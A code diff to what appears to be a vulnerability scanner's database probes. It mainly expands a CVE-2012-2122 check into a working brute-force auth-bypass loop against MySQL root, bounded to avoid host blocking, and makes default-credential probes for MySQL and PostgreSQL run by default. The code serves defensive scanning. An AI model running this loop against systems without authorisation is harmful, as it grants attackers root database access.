@@ -158,7 +158,7 @@ class _ServiceDatabaseMixin(_ServiceProbeBase):
   )
   def _service_info_mysql_creds(self, target, port):  # default port: 3306
     """
-    MySQL default credential testing (opt-in via active_auth feature group).
+    MySQL default credential testing (runs unless the active_auth feature group is excluded).
 
     Attempts mysql_native_password auth with a small list of default credentials.
 
@@ -270,7 +270,10 @@ class _ServiceDatabaseMixin(_ServiceProbeBase):
     # Affected (as the catalog rows): MySQL 5.1.x < 5.1.63, 5.5.x < 5.5.24, 5.6.x < 5.6.6. MariaDB is not probed:
     # its 5.x banners are skipped below, and 10.x is not affected.
     # Bug: memcmp return value truncation means ~1/256 chance of auth bypass
-    cve_bypass = self._mysql_test_cve_2012_2122(target, port)
+    cve_trace = {}
+    cve_bypass = self._mysql_test_cve_2012_2122(target, port, trace=cve_trace)
+    if cve_trace:
+      raw["cve_2012_2122_trace"] = cve_trace
     if cve_bypass:
       findings.append(cve_bypass)
       raw["cve_2012_2122"] = True
@@ -298,12 +301,23 @@ class _ServiceDatabaseMixin(_ServiceProbeBase):
     ((5, 6, 0), (5, 6, 6)),    # MySQL 5.6.x < 5.6.6
   ]
 
-  def _mysql_test_cve_2012_2122(self, target, port):
+  # ~98% hit rate at 1/256 per attempt; the time and error bounds keep a dead host from stalling the probe.
+  _MYSQL_CVE_2012_2122_ATTEMPTS = 1000
+  _MYSQL_CVE_2012_2122_MAX_SECONDS = 120
+  _MYSQL_CVE_2012_2122_MAX_ERRORS = 5
+  _MYSQL_CVE_2012_2122_MAX_TOTAL_ERRORS = 8
+
+  def _mysql_test_cve_2012_2122(self, target, port, trace=None):
     """Test for MySQL CVE-2012-2122 timing-based authentication bypass.
 
     On affected versions, memcmp() return value is cast to char, giving
-    a ~1/256 chance that any password is accepted. 300 attempts gives
-    ~69% probability of detection.
+    a ~1/256 chance that any password is accepted. 1000 attempts gives
+    ~98% probability of detection.
+
+    ``trace`` (dict, optional) receives ``attempts`` (logins sent), ``ended_by``
+    (``attempts_exhausted``, ``time_limit``, ``consecutive_errors``,
+    ``error_limit``, ``stopped``, ``bad_handshake``, ``version_probe_error``
+    or ``bypass_confirmed``) and ``last_error``.
 
     Returns
     -------
@@ -312,6 +326,10 @@ class _ServiceDatabaseMixin(_ServiceProbeBase):
     """
     import hashlib
     import random
+    import time
+
+    if trace is None:
+      trace = {}
 
     # First, connect to get version
     try:
@@ -320,7 +338,10 @@ class _ServiceDatabaseMixin(_ServiceProbeBase):
       sock.connect((target, port))
       data = sock.recv(256)
       sock.close()
-    except Exception:
+    except Exception as exc:
+      trace["ended_by"] = "version_probe_error"
+      trace["last_error"] = f"{type(exc).__name__}: {exc}"
+      self.P(f"MySQL CVE-2012-2122 version read on {target}:{port} failed: {trace['last_error']}", color='y')
       return None
 
     if not data or len(data) < 5:
@@ -351,79 +372,119 @@ class _ServiceDatabaseMixin(_ServiceProbeBase):
 
     # Attempt rapid auth with random passwords
     self.P(f"MySQL {version_str} in CVE-2012-2122 range — testing auth bypass ({target}:{port})", color='y')
-    attempts = 300
+    attempts = self._MYSQL_CVE_2012_2122_ATTEMPTS
+    trace["attempts"] = 0
+    trace["ended_by"] = "attempts_exhausted"
+    started = time.monotonic()
+    consecutive_errors = total_errors = 0
+    sock = None
 
     try:
-      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      sock.settimeout(self._target_timeout(5))
-      sock.connect((target, port))
-
       for _ in range(attempts):
-        # Read handshake
-        data = sock.recv(512)
-        if not data or len(data) < 5:
+        if self.stop_event is not None and self.stop_event.is_set():
+          trace["ended_by"] = "stopped"
           break
-        pkt_payload = data[4:]
-        if not pkt_payload or pkt_payload[0] != 0x0a:
+        if time.monotonic() - started >= self._MYSQL_CVE_2012_2122_MAX_SECONDS:
+          trace["ended_by"] = "time_limit"
           break
+        try:
+          if sock is None:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self._target_timeout(3))
+            sock.connect((target, port))
+          # Read handshake
+          data = sock.recv(512)
+          if not data or len(data) < 5:
+            trace["ended_by"] = "bad_handshake"
+            break
+          pkt_payload = data[4:]
+          if not pkt_payload or pkt_payload[0] != 0x0a:
+            trace["ended_by"] = "bad_handshake"
+            break
 
-        # Extract salt
-        parts = pkt_payload[1:].split(b'\x00', 1)
-        rest = parts[1] if len(parts) > 1 else b''
-        if len(rest) < 13:
-          break
-        salt1 = rest[5:13]
-        salt2 = rest[28:40].rstrip(b'\x00') if len(rest) >= 28 else b''
-        salt = salt1 + salt2
+          # Extract salt
+          parts = pkt_payload[1:].split(b'\x00', 1)
+          rest = parts[1] if len(parts) > 1 else b''
+          if len(rest) < 13:
+            trace["ended_by"] = "bad_handshake"
+            break
+          salt1 = rest[5:13]
+          salt2 = rest[28:40].rstrip(b'\x00') if len(rest) >= 28 else b''
+          salt = salt1 + salt2
 
-        # Auth with random password
-        rand_pass = random.randbytes(20)
-        sha1_pass = hashlib.sha1(rand_pass).digest()
-        sha1_sha1 = hashlib.sha1(sha1_pass).digest()
-        sha1_salt = hashlib.sha1(salt + sha1_sha1).digest()
-        auth_data = bytes(a ^ b for a, b in zip(sha1_pass, sha1_salt))
+          # Auth with random password
+          rand_pass = random.randbytes(20)
+          sha1_pass = hashlib.sha1(rand_pass).digest()
+          sha1_sha1 = hashlib.sha1(sha1_pass).digest()
+          sha1_salt = hashlib.sha1(salt + sha1_sha1).digest()
+          auth_data = bytes(a ^ b for a, b in zip(sha1_pass, sha1_salt))
 
-        client_flags = struct.pack('<I', 0x0003a685)
-        max_pkt = struct.pack('<I', 16777216)
-        charset = b'\x21'
-        reserved = b'\x00' * 23
-        user_bytes = b'root\x00'
-        auth_len = bytes([len(auth_data)])
-        auth_plugin = b'mysql_native_password\x00'
+          client_flags = struct.pack('<I', 0x0003a685)
+          max_pkt = struct.pack('<I', 16777216)
+          charset = b'\x21'
+          reserved = b'\x00' * 23
+          user_bytes = b'root\x00'
+          auth_len = bytes([len(auth_data)])
+          auth_plugin = b'mysql_native_password\x00'
 
-        payload = client_flags + max_pkt + charset + reserved + user_bytes + auth_len + auth_data + auth_plugin
-        pkt_len = struct.pack('<I', len(payload))[:3]
-        seq = b'\x01'
-        sock.sendall(pkt_len + seq + payload)
+          payload = client_flags + max_pkt + charset + reserved + user_bytes + auth_len + auth_data + auth_plugin
+          pkt_len = struct.pack('<I', len(payload))[:3]
+          seq = b'\x01'
+          sock.sendall(pkt_len + seq + payload)
+          trace["attempts"] += 1
 
-        resp = sock.recv(256)
-        if resp and len(resp) >= 5 and resp[4] == 0x00:
+          resp = sock.recv(256)
+          consecutive_errors = 0
+          if resp and len(resp) >= 5 and resp[4] == 0x00:
+            trace["ended_by"] = "bypass_confirmed"
+            return Finding(
+              severity=Severity.CRITICAL,
+              cvss_vector=V.UNAUTHENTICATED_FULL_CONTROL,
+              title=f"MySQL authentication bypass confirmed (CVE-2012-2122)",
+              cve=("CVE-2012-2122",),
+              **probe_cve_fields("CVE-2012-2122"),
+              description=f"MySQL {version_str} on {target}:{port} accepted login with a random password "
+                          "due to CVE-2012-2122 memcmp truncation bug. Any attacker can gain root access.",
+              evidence=f"Auth succeeded with random password on attempt (version {version_str})",
+              remediation="Upgrade MySQL to at least 5.1.63 / 5.5.25 / MariaDB 5.5.23.",
+              owasp_id="A07:2021",
+              cwe_id="CWE-305",
+              confidence="certain",
+            )
+
+          # The server closes the connection after a rejected login: reconnect.
+          if resp and len(resp) >= 5 and resp[4] == 0xFF:
+            sock.close()
+            sock = None
+        except Exception as exc:
+          consecutive_errors += 1
+          total_errors += 1
+          trace["last_error"] = f"{type(exc).__name__}: {exc}"
+          if sock is not None:
+            try:
+              sock.close()
+            except Exception:
+              pass
+            sock = None
+          if consecutive_errors >= self._MYSQL_CVE_2012_2122_MAX_ERRORS:
+            trace["ended_by"] = "consecutive_errors"
+            break
+          # Stay under max_connect_errors (default 10 on the targeted versions before 5.6.6;
+          # the version read and earlier probes also count) so the scanner host is not blocked.
+          if total_errors >= self._MYSQL_CVE_2012_2122_MAX_TOTAL_ERRORS:
+            trace["ended_by"] = "error_limit"
+            break
+    finally:
+      self.P(
+        f"MySQL CVE-2012-2122 loop on {target}:{port} ended: attempts={trace['attempts']}, "
+        f"ended_by={trace['ended_by']}, last_error={trace.get('last_error')}",
+        color='y',
+      )
+      if sock is not None:
+        try:
           sock.close()
-          return Finding(
-            severity=Severity.CRITICAL,
-            cvss_vector=V.UNAUTHENTICATED_FULL_CONTROL,
-            title=f"MySQL authentication bypass confirmed (CVE-2012-2122)",
-            cve=("CVE-2012-2122",),
-            **probe_cve_fields("CVE-2012-2122"),
-            description=f"MySQL {version_str} on {target}:{port} accepted login with a random password "
-                        "due to CVE-2012-2122 memcmp truncation bug. Any attacker can gain root access.",
-            evidence=f"Auth succeeded with random password on attempt (version {version_str})",
-            remediation="Upgrade MySQL to at least 5.1.63 / 5.5.25 / MariaDB 5.5.23.",
-            owasp_id="A07:2021",
-            cwe_id="CWE-305",
-            confidence="certain",
-          )
-
-        # If error packet, server closes connection — reconnect
-        if resp and len(resp) >= 5 and resp[4] == 0xFF:
-          sock.close()
-          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-          sock.settimeout(self._target_timeout(3))
-          sock.connect((target, port))
-
-      sock.close()
-    except Exception:
-      pass
+        except Exception:
+          pass
     return None
 
   # SAFETY: Read-only commands only. NEVER add CONFIG SET, SLAVEOF, MODULE LOAD, EVAL, DEBUG.
@@ -919,7 +980,7 @@ class _ServiceDatabaseMixin(_ServiceProbeBase):
   )
   def _service_info_postgresql_creds(self, target, port):  # default port: 5432
     """
-    PostgreSQL default credential testing (opt-in via active_auth feature group).
+    PostgreSQL default credential testing (runs unless the active_auth feature group is excluded).
 
     Attempts cleartext password auth with common defaults.
 
